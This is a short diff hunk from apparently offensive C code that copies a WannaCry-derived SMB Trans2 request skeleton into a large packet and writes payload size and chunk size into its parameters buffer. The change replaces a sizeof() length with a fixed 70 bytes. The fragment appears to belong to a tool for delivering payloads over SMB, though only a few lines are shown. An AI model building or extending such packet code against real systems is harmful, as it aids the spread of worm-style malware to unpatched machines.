@@ -340,7 +340,7 @@ int main(int argc, char* argv[])
 	*/
 	
 	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
+	memcpy(big_packet, wannacry_Trans2_Request, 70);
 
 	memcpy(Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
 	memcpy(Parametersbuffer + 4, (char*)&ChunkSize, 4);
